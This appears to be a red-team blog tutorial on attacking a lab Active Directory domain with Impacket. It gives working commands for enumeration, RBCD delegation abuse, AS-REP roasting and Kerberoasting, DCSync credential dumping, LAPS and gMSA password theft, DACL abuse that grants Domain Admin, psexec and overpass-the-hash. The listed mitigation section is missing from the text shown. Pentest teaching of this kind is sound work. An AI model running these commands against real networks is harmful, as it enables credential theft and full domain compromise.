@@ -1,0 +1,231 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">Active Directory Penetration Testing Using Impacket</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/active-directory-penetration-testing-using-impacket/" rel="bookmark"><time class="entry-date published" datetime="2025-06-23T10:19:36+00:00">June 23, 2025</time><time class="updated" datetime="2025-06-26T09:07:33+00:00">June 26, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Impacket is a powerful Python toolkit for working with network protocols, particularly useful in Active Directory (AD) penetration testing. It provides various scripts to exploit common AD vulnerabilities, perform lateral movement, and extract sensitive data. This article demonstrates practical AD pentesting techniques using Impacket, covering enumeration, exploitation, and post exploitation.</span></p>
+<h3><span style="color: #800000;">Table of Contents</span></h3>
+<p><span style="color: #000000;"><strong>Introduction to Impacket</strong></span></p>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Enumerate SIDs</span></li>
+<li><span style="color: #000000;">Enumerating AD Users</span></li>
+<li><span style="color: #000000;">Enumerating AD Computers</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Resource-Based Constrained Delegation (RBCD) Attack</strong></span></p>
+<p><span style="color: #000000;"><strong>Kerberos-Based Attacks</strong></span></p>
+<ul>
+<li><span style="color: #000000;">AS-REP Roasting</span></li>
+<li><span style="color: #000000;">Kerberoasting</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Credential Dumping</strong></span></p>
+<ul>
+<li><span style="color: #000000;">DCSync Attack</span></li>
+<li><span style="color: #000000;">Local Administrator Password Solution (LAPS) Extraction</span></li>
+<li><span style="color: #000000;">GMSA Attack</span></li>
+</ul>
+<p><strong><span style="color: #000000;">Abusing AD-DACL</span></strong></p>
+<ul>
+<li><span style="color: #000000;">ForceChangePassword</span></li>
+<li><span style="color: #000000;">WriteDacl &amp; WriteOwner</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Overpass-the-Hash</strong></span></p>
+<p><span style="color: #000000;"><strong>Shadow Credentials Attack</strong></span></p>
+<p><span style="color: #000000;"><strong>Extracting Credentials from Registry Hive</strong></span></p>
+<p><span style="color: #000000;"><strong>Mitigation</strong></span></p>
+<p><span style="color: #000000;"><strong>Conclusion</strong></span></p>
+<h3><span style="color: #800000;">Introduction to Impacket</span></h3>
+<p><span style="color: #000000;">Impacket is a versatile Python-based toolkit widely used in both penetration testing and malicious hacking efforts. For penetration testers, Impacket facilitates the simulation of realistic attack scenarios, allowing for identification and remediation of vulnerabilities within an organization’s network. Adversaries often use Impacket to exploit Windows services and protocols, move laterally within networks, escalate privileges, and access sensitive data. Impacket is a favored tool for threat actors including ransomware groups due to its comprehensive suite of capabilities for reconnaissance, credential dumping, and unauthorized command execution.</span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">Enumeration is the first step in AD pentesting to gather information about users, computers, and other AD objects.</span></p>
+<h4><span style="color: #000000;">Enumerate SIDs</span></h4>
+<p><span style="color: #000000;">Impacket’s lookupsid allows you to enumerate user SIDs (Security Identifiers) and group SIDs on a Windows system. Each user account and group account on a Windows system has a unique SID. By obtaining the SIDs, you can gather information about existing user accounts, which can be valuable in understanding the network’s structure and potential attack vectors. </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-lookupsid ignite.local/krishna:Password@1@192.168.1.14</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgiUvEyosHxbb87VxJAb0dY_VbC4f1HaqaGXtkbHuddL2dGPe8LzxHsOQNid4uAyCMA0JirbZGt8sGizHywaYfeBSvtcAsVZc1vt1rG42PvIAihZVfKfzBWvISfU29PUQxGLIVuI1VC9QiiM5lGHfon-YOlht6xaXUwW5Gz7p2cvOH5TATlhiBv4Z_x_B7o/s16000/0.png"/></span></p>
+<h4><span style="color: #000000;">Enumerate AD Users</span></h4>
+<p><span style="color: #000000;">Impacket’s GetADUsers tool is used to query Active Directory users. It works by using credentials and performing an LDAP query to get information about users within the AD environment. It can help extract things like username, descriptions (maybe some interesting info), last login time, password last set and more.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-GetADUsers ignite.local/Administrator:Ignite@987 -dc-ip 192.168.1.14 -all</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjLajL9Fq4vvpl_C4K1B0aHUi41cZC2NeB2rcEQjyun8_TRvOOpUPGdJ5kaLmPMHod_34NhNyQzxlHR4cRpnK3GGBxJEr5qJFN6gdul2NyqCedyhhMUopR_rBP2r0zDtJ4BF3MqXBlAryBsTlx_LlIpi2u5xPRnortWm4Ak7POu2erm8FmRFRSB3pGAjHaH/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">Retrieves all AD users along with their attributes (e.g., last logon, description).</span></p>
+<h4><span style="color: #000000;">Enumerate AD Computers</span></h4>
+<p><span style="color: #000000;">Lists all computer objects in the domain.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-GetADComputers ignite.local/aarti:Password@1 -dc-ip 192.168.1.14</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjYl9bxqEgztVRzzivVJd9rsw7ru0haLdyAunlcNnjcFiVzLGStlxZK3RKWn8XckwAX0WTvUNdGPN6EucJlbGuJ8gRHj_0lTki_OSeElfcIh5T0Tq0hYJAu4AXakZhUdYjJ0y7zW5WmiBrm_4ktTRYLNNuGG3nsfpIToZqN-Ma4ubokv8tvARw_1eocu40T/s16000/2.png"/></span></p>
+<h3><span style="color: #800000;">Resource-Based Constrained Delegation (RBCD) Attack</span></h3>
+<p><span style="color: #000000;"><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/">Resource-Based Constrained Delegation</a></span> (RBCD) is a security feature in Active Directory (AD) that allows a computer object to specify which users or machines can impersonate accounts to access its resources. This delegation method provides more granular control compared to older unconstrained and constrained delegation methods. However, attackers can exploit misconfigured RBCD to gain unauthorized access and escalate privileges within a domain.</span></p>
+<p><span style="color: #000000;">The following steps outline the process:</span></p>
+<ul>
+<li><span style="color: #000000;">Create a fake computer account</span></li>
+<li><span style="color: #000000;">Edit the target’s “rbcd” attribute by delegating control on a domain controller (DC) to this fake machine</span></li>
+<li><span style="color: #000000;">Fake computer account acts on behalf of Domain Controller (DC$) account</span></li>
+<li><span style="color: #000000;">Obtain a ticket (delegation operation)</span></li>
+<li><span style="color: #000000;">Once the ticket is obtained, it can be used with pass-the-ticket.</span></li>
+</ul>
+<h5><span style="color: #000000;"><strong>Abuse MachineAccountQuota to create a computer account</strong></span></h5>
+<p><span style="color: #000000;">Since Active Directory allows users to create machine accounts (if MachineAccountQuota &gt; 0), we leverage this to create a new fake machine using the Geet account.</span></p>
+<p><span style="color: #000000;">To do this, we’ll use addcomputer script, this script has a SAMR option to add a new computer, which functions over SMB.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-addcomputer ignite.local/geet:Password@1 -computer-name fakepc -computer-pass Password@123 -dc-ip 192.168.1.14</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2smcCdDHxhyiphtexzWWm08aFBDq9kbbzDAbJYbipwJGLThZhH4Haianic_t3MX_JOIoUwSNfg2PuPVPW4hKtdc_q3o2g7EbpsXfE7AmZRREq5IpmhrLqEPt7w_Qi_5zoCLP96x4YVaGNx7tWCyYnTa6zjSSvtw7Ryc1cr-4rx82ao98KSLKjGu6xVQv4/s16000/3.png"/></span></p>
+<h5><span style="color: #000000;"><strong>Rewrite DC’s AllowedToActOnBehalfOfOtherIdentity properties</strong></span></h5>
+<p><span style="color: #000000;">We will configure msDS-AllowedToActOnBehalfOfOtherIdentity on the domain controller (DC$), allowing our fake machine account to impersonate users.</span></p>
+<p><span style="color: #000000;">We can use Impacket’s rbcd script to read, write, or clear delegation rights. Make sure you use credentials of a domain user who has the appropriate permissions.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-rbcd ignite.local/geet:Password@1 -action write -delegate-to 'DC$' -delegate-from 'farkepc$' -dc-ip 192.168.1.14</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjhH3uylDfEmraATUlAzQfMcWL-q00LQgLauigsKddDu09MOccKjzn4VE8ymyWBq3ZEfBBzp2yqF27VPT1YvxfUNAe2wPBSzOjK_ilHupwAatA9vUiaYSi-jBxxvfJtX_JCnQrodqnOjPj5gxv3SOo41S78FTSodg4f__NtcJd8TfU9HMzthLoKU_4rkQuE/s16000/4.png"/></span></p>
+<h5><span style="color: #000000;"><strong>Generate a Service Ticket for CIFS</strong></span></h5>
+<p><span style="color: #000000;">The fake machine account requests a Kerberos Service Ticket for a privileged user (e.g., Administrator) using Service for User to Self (S4U2Self).</span></p>
+<p><span style="color: #000000;">Then, it escalates the ticket using Service for User to Proxy (S4U2Proxy) to obtain access to DC$.</span></p>
+<p><span style="color: #000000;">Once you modify the delegation attribute, you can use the Impacket getST script to obtain a Service Ticket (ST) for impersonation. For instance, you may impersonate the Administrator or any other user within the domain.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-getST ignite.local/'farzipc$':Password@123 -spn cifs/DC.ignite.local -impersonate administrator -dc-ip 192.168.1.14</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiC30M9Sfyfgpq1Ja3VM86IFPUmYCOoxFJSaS6OtbSjziNZXMnBgpqObYbV1nAcicE_Z-nbKA2GTzUHw53B88YxUM7idhrXmmKt-bc5vuyR-772eMUF7GherkoLYyK4y7_6BtcFGzIZ973EnGqxLtkia79fs2OaAMgfrouCYvPUL3tBWHcwUsrTHAZMsJAi/s16000/5.png"/></span></p>
+<h5><span style="color: #000000;"><strong>Obtain Privileged Access</strong></span></h5>
+<p><span style="color: #000000;">After you obtain the Kerberos ticket, you can use it with pass-the-ticket techniques.</span></p>
+<p><span style="color: #000000;">In order to use the ticket, first export an environment variable that points to the created ticket.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">export KRB5CCNAME=administrator@cifs_DC.ignite.local@IGNITE.LOCAL.ccache</pre>
+<p><span style="color: #000000;">Use impacket’s psexec for the remote code execution using pass-the-ticket method.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-psexec ignite.local/administrator@DC.ignite.local -k -no-pass -dc-ip 192.168.1.14</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEimNdxdQVMTwqCifV07V3Sn4RkIR0ZfNA3cTqcjN1LSp8Px1I-FXpWDz_J6QKIg6Fv03jhd8mWw6nwPUk7adD2fY-MjgEq9C3guPbRvt9eSHIXcDFuAiRDotkHFuaPrY_4EREO5p3tYPqNvzGu9UaOGjpV4f-Q-y4XfPCU6lqrsjhrXC8qNRMWvXTTZlvaa/s16000/6.png"/></span></p>
+<h3><span style="color: #800000;">Kerberos-Based Attacks</span></h3>
+<p><span style="color: #000000;">Kerberos is a common target for AD attacks due to misconfigurations and weak credentials.</span></p>
+<h4><span style="color: #000000;">AS-REP Roasting</span></h4>
+<p><span style="color: #000000;"><a style="color: #000000;" href="https://www.hackingarticles.in/as-rep-roasting/"><span style="color: #0000ff;">AS-REP Roasting</span></a> is an attack targeting the Kerberos authentication protocol. It exploits accounts where Kerberos pre authentication is disabled, allowing attackers to crack passwords offline.</span></p>
+<p><span style="color: #000000;"><strong>How the Attack Works:</strong></span></p>
+<ol>
+<li><span style="color: #000000;"><strong>Request a Ticket:</strong> The attacker sends a request to the Key Distribution Center (KDC) for an account with pre-authentication disabled.</span></li>
+<li><span style="color: #000000;"><strong>Receive Encrypted Data:</strong> The KDC sends back an AS-REP response, encrypted using the account’s password hash.</span></li>
+<li><span style="color: #000000;"><strong>Crack the Password:</strong> The attacker uses tools to brute force the password offline. If the password is weak, they gain access.</span></li>
+</ol>
+<p><span style="color: #000000;">The GetNPUsers script within Impacket can be used to perform AS-REP Roasting attacks and retrieve password hashes.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-GetNPUsers -dc-ip 192.168.1.14 ignite.local/ -usersfile users.txt -format john -outputfile hashes</pre>
+<p><span style="color: #000000;">Further, with the help of John the Ripper dictionary such as Rockyou can help the attacker to extract the password from the hash.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">john -w=/usr/share/wordlists/rockyou.txt hashes</pre>
+<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLxb2ZMs81EnKBvFvicrx_hmvU6G5lpvNV4zzOM-lC9uwG0BehCJN7Lsnl-ZdK6QkrnV3H_6uAfbiA32LIiDSJ0GxsO-Q_Occ8xj-rpOTfvcndICVRRPGj84nAvaiZD7cf9VXV0LSsXnjMcb2WobMAJ49eR59WPh9s1iEBgRExlSk7Bv61l2hl3j3SP-YY/s16000/7.png" alt="Impacket Active Directory Attacks" width="1467" height="681"/></span></p>
+<h4><span style="color: #000000;">Kerberoasting</span></h4>
+<p><span style="color: #000000;"><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/">Kerberoasting</a> </span>is a technique that allows an attacker to steal the KRB_TGS ticket, that is encrypted with RC4, to brute force application services hash to extract its password.</span></p>
+<p><span style="color: #000000;">Impacket’s GetUserSPNs script will try to find and fetch Service Principal Names that are associated with normal user accounts. Output is compatible with John the Ripper and HashCat.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-GetUserSPNs -request -dc-ip 192.168.1.14 ignite.local/shivam:Password@1</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiVFt4nlHwPgTDpJsiEHFq3EkAQREuM_J155HRa8FGsIvq4az3Fv8NQAD_TiX4jwRNfvT85l7CnLUpk7Jwq5weQPBmnfojRxJXp8bShhjVGiNuiPZTf1GJAxuYNXpHJyc2Yz1GyT2xPOwVusW2Kjwlvm6K0pVDo46EvhasOqW2LAAfZJ36be5lnaB2b6nXL/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">Further, with the help of John the Ripper dictionary such as Rockyou can help the attacker to extract the password from the hash.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">john -w=/usr/share/wordlists/rockyou.txt hashes</pre>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhRVS02Mw7Yja9YOQXOI9kFRRhhi4aAxigNVdhyxUb8TJDAzMKRMlRJbDkDxPpRencRu5VpWCGioU-UFj20JzDRfiJzvweXvTAeZT4beOzYnkYMfScR2OcVg5jzNY3FbirR8jxZ2TwPknqZEzCz_6ZVqxslTMTsm2yE6x8JrIAqsX21kZqiji6er-7ffbwc/s16000/9.png" alt="Impacket Active Directory Attacks" width="1119" height="338"/></span></p>
+<h3><span style="color: #800000;">Credential Dumping</span></h3>
+<h4><span style="color: #000000;">DCSync Attack</span></h4>
+<p><span style="color: #000000;">A <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/credential-dumping-dcsync-attack/">DCSync attack</a></span> uses commands in Microsoft Directory Replication Service Remote Protocol (MS-DRSR) to pretend to be a domain controller (DC) in order to get user credentials from another DC.</span></p>
+<p><span style="color: #000000;">Impacket’s secretsdump.py will perform various techniques to dump secrets from the remote machine without executing any agent. Techniques include reading SAM and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, and kerberos keys, and dumping NTDS.dit.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-secretsdump ignite.local/komal:Password@1@192.168.1.14</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjK0DKtijtMCc29HdPDq4ci7PTFR7xZo3PlEDNugGjoZbVPFFLp5vqFL04x7HeC1goq79WzNOcxqeylh_ykStvBZRoghexmdpRIOlLJQ_4TFFfsY0eYTaMhFZlO32ODx3AnmkKA4i1MmP-lSnCS1kx-c94pZeD0UVGK8arQ-rwLzAOaAPfrBXQoO6hyC-tV/s16000/10.png"/></span></p>
+<h4><span style="color: #000000;">Local Administrator Password Solution (LAPS) Extraction</span></h4>
+<p><span style="color: #000000;">LAPS (<span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/credential-dumping-laps/">Local Administrator Password Solution</a></strong></span>) is a Microsoft solution that randomizes and stores local administrator passwords.</span></p>
+<p><span style="color: #000000;">If LAPS is implemented, we can retrieve local admin passwords.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-GetLAPSPassword ignite.local/aarti:Password@1 -dc-ip 192.168.1.14</pre>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj5bC68O7B_AcW3I3Y6giyWBcXulsSGRm74V5k3Tg3hY95aUvopKAUi34u8labN-upkIDShodfbNI4Nyf-LUBM6MHphX5ZdwGh7jd3wGMNI3AT6h1X7ZHqztYproRGBiXyrScqWbOBpXC603beYaomnfTsH_PjiBvg38WcU6lI3gcTYgP2gZeHPinOywPfp/s16000/50.png" alt="Impacket Active Directory Attacks" width="1036" height="194"/></span></p>
+<h4><span style="color: #000000;">GMSA Attack</span></h4>
+<p><span style="color: #000000;">Service accounts’ passwords are commonly not regularly rotated, putting them at risk, especially because they can be targeted through Kerberoasting attacks. </span></p>
+<p><span style="color: #000000;"><strong>ReadGMSAPassword Attack</strong> is a technique where attackers abuse misconfigured <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/readgmsapassword-attack/">Group Managed Service Accounts</a></span> (gMSA)</strong> to retrieve their passwords.</span></p>
+<p><span style="color: #000000;">In Active Directory, administrators should only grant ReadGMSAPassword to specific systems. However, if they misconfigure these permissions, an attacker with access to a machine that can query the gMSA password can extract it and use it to authenticate as that service account. </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-secretsdump ignite.local/komal:Password@1@192.168.1.14 | grep GMSA</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh47T0Xo760nDvwUqybqSOCqyvXDYe5WTlj03IOtMhCptEqzoBQKrbPSRuCOvmxdE-kGq2k0OMT-K9NdvYSrUMXcx6heIJsRgGkkicfHMeJbYXz1MY7xnbvkPm5MpCc1Z-lZRfl6uiIk6fRwI6agGcF3lon_a16RkOfUq5G7ZAyjZrTglAfsWL5i7KlcF_A/s16000/51.png"/></span></p>
+<h3><span style="color: #800000;">Abusing AD-DACL</span></h3>
+<h4><span style="color: #800000;">ForceChangePassword</span></h4>
+<p><span style="color: #000000;"><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/">ForceChangePassword</a></span> permission grants the right to change the password of a user account without knowing their current password. Consequently, attackers can use this access to perform unauthorized actions.</span></p>
+<p><span style="color: #000000;">Using impacket’s changepasswd attackers can use <strong>smbpasswd</strong> from <strong>Impacket</strong> to change a user’s password over the <strong>SMB protocol</strong> without knowing the current password.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-changepasswd ignite.local/panther@192.168.1.14 -newpass Password@1234 -altuser ignite.local/suri -altpass Password@1 -reset</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikYteOh4-w826WyKn-zyIEzynhPiagMH2buG3tb0wNw-_hGXsXWkwuUfl5NWzIdY5c7NzbkzwviE0Bj0d4bDStiS5wtuFrNAdg1Zl9lVTI_lPec5MFaoTlqrkFZP52ICAmLfU1VYZoPfeba-LIh93FTUjoIuNimlGbgLb2NrWfsEv6TCQs3dpDUY2Gz0Uj/s16000/60.png" alt="Impacket Active Directory Attacks" width="1713" height="255"/></span></p>
+<p><span style="color: #000000;">Impacket’s changepassword can also be used to change current user password, if current password is known.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-changepasswd ignite.local/komal@192.168.1.14 -newpass ‘Password@987’ -p rpc-samr</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi9Y2SnlYPnYXiO_9jfr-gUYT-YGT4fym0Vvna2WxTiDe0CTqvRMkPcBm9jDtcos-eCfLB5uMcLWUwb878BbAqCn7uA3iHWYrAAV2Ubb7frFZrT00VxFClEAobJYJuv9ti9Y0cOcbSCnNAsjiWwKx_QmO0BEkrISNMrc84TdvOhZdlnZ3Pje0xPO9p02_47/s16000/61.png"/></span></p>
+<h4><span style="color: #800000;">WriteDacl &amp; WriteOwner</span></h4>
+<h4><span style="color: #000000;">Granting Ownership</span></h4>
+<p><span style="color: #000000;">The <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/abusing-ad-dacl-writeowner/">WriteOwner</a> </span>permission allows a user to change the ownership of an object to a different user or principal, including one controlled by an attacker. Consequently, an attacker can exploit this permission to take ownership of a target object.</span></p>
+<p><span style="color: #000000;">The tool owneredit allows <strong>changing ownership</strong> of a directory object.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-owneredit -action write -new-owner 'aaru' -target-dn 'CN=Domain Admins,CN=Users,DC=ignite,DC=local' 'ignite.local'/'aaru':'Password@1' -dc-ip 192.168.1.14</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjhTV78bJZh5aBK9dBLrQRonurp3Cg6m0vMqz9SGaox4iBzQGp7HPuZrCLhM7Za-IemMOC79tOFmNT4hK2NXYyBb7Gf1gXeLWiC69t7kxSsGRIY3iSMMjlXcr7MVsSI7n5QfqX6qjydExHbxlzWivJZ5QM6tFWFaDcWAwXAHSJtWQQIAgXQoplG-xTPcEX9/s16000/62.png" alt="Impacket Active Directory Attacks" width="2103" height="273"/></span></p>
+<h4><span style="color: #000000;">Granting Control</span></h4>
+<p><span style="color: #000000;">The <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/abusing-ad-dacl-writedacl/">WriteDacl</a> </span>permission in Active Directory allows users to modify the Discretionary Access Control List (DACL) of an AD object, giving them the ability to control object level permissions.</span></p>
+<p><span style="color: #000000;">This can be done with Impacket-dacledit.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'aaru' -target-dn 'CN=Domain Admins,CN=Users,DC=ignite,DC=local' 'ignite.local'/'aaru':'Password@1' -dc-ip 192.168.1.14</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgYD3g5gxGd_nVGzSDWk2t7aZ1ZGPpsXIUvClPIli12nNYmPL4UzNYgmNo11zzm_jR2qM2bdDS73u8KBmoVcpOk4c7dl4UOdPghtHSMHVVu6KW2xb3pUQdrC9z79OgTPJFLXcHoKDRralH2sP7LFC7_PI1VGaDUfzQD0fz3d_xOHf86end4L_fp-H6qqhNW/s16000/63.png" alt="Impacket Active Directory Attacks" width="2401" height="206"/></span></p>
+<p><span style="color: #000000;">The tester can abuse these permission by adding Aaru User into the Domain Admin group and listing the domain admin members to ensure that Aaru Users become Domain Admin.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodyAD --host "192.168.1.14" -d "ignite.local" -u "aaru" -p "Password@1" add groupMember "Domain Admins" "aaru"</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhavwc39f9XZGTctxwG66kD67-2h4N-PR45cyj9t0vSEIl7CvHkNbChhelLozheQlxuB6LPo0hQzLrTy-nqpkz63LiVld50kzTWU2w9y4r6FyFNFZmGVOMav_0zRM85ZL-Y_I-fGNg7oaMspQDO_ck_9UGDNWNQsRMjcOP3gtomC6IF76dsdkbnPtdGhQQN/s16000/64.png" alt="Impacket Active Directory Attacks" width="1530" height="135"/></span></p>
+<p><span style="color: #000000;">Impacket’s PsExec is another widely used post exploitation tool for remote command execution. After adding Aaru user in domain admins group, attacker/tester can use psexec for remote contro; execution.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-psexec aaru:Password@1@ignite.local -dc-ip 192.168.1.14</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjUvplh1HOWXGCcxAAYPOOiwlCKMCPZi1CBMHytF6E60vv_XSULhOIAk501iCdNapOoQq5nZ-FocSU-TagGFNtuZnq7oo2UvgOaiFc15ogzUyw9ACvcoJ1UlhkwynDRRhfMY5NsDDbM5Fo0GQ8t53RNl3EZ1YfY7dFT7wReDfTB_RlVR08hN5ahromYb5Tu/s16000/65.png"/></span></p>
+<h3><span style="color: #800000;">Overpass-the-Hash</span></h3>
+<p><span style="color: #000000;">Over Pass the hash is a combination of passing the hash and passing the ticket, so it’s called Over Pass the hash. Allows the creation of Kerberos tickets from NTLM hash or AES keys that allow access to the resource service that required Kerberos authentication.</span></p>
+<p><span style="color: #000000;">use impacket python script <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py"><strong>gettgt.py</strong></a></span> which will use a password, hash or aesKey, it will request a TGT and save it as ccache.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-getTGT -dc-ip 192.168.1.14 -hashes :32196b56ffe6f45e294117b91a83bf38 ignite.local/Administrator</pre>
+<p><span style="color: #000000;">With the help of above command, you will be able to request Kerberos authorized ticket in the form of ccache whereas with the help of the following command you will be able to inject the ticket to access the resource.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">export KRB5CCNAME=Administrator.ccache
+impacket-psexec ignite.local/administrator@DC.ignite.local -k -no-pass -dc-ip 192.168.1.14</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiU9h3hL0_OvFoYhBtRBYUjVAiWAKWGvY7gShO2r6oEIbhNRwNDKKrotHxJ12s7tUkKBq7niz8V6gs2rzyDTuRbzTjMSFOqOP5IC1S9CdyU1jZ3-fVfwzvVSPt_d6oosESV2AL3H_snkweWLU11GRsEiOKgrQi8PXuLty4ZeqCyd1iAXwRVku6OOi7Qp8N-/s16000/70.png" alt="Impacket Active Directory Attacks" width="1427" height="641"/></span></p>
+<p><span style="color: #000000;">Overpass-the-Hash (Convert NTLM to Kerberos)</span></p>
+<p><span style="color: #000000;">Converts an NTLM hash into a Kerberos TGT for stealthier access.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-describeTicket Administrator.ccache</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSlkPhoX0wIFdAaeWVlMUHamUSZTQd9eSzzEX3oXN56-ycw-zG2Xpbx72ERRPDJbSFoh1LrvFxjgu6lBqffw0frm3-aYL-1IbOBL1amungK819Ggr4L23HFOEh5StUrzGmhcgLTK0ZBVagP5okHUbORFp8gJas5x5IzarsBjFNnRuoRflCEOpYtSlrgPkU/s16000/71.png" alt="Impacket Active Directory Attacks" width="1146" height="571"/></span></p>
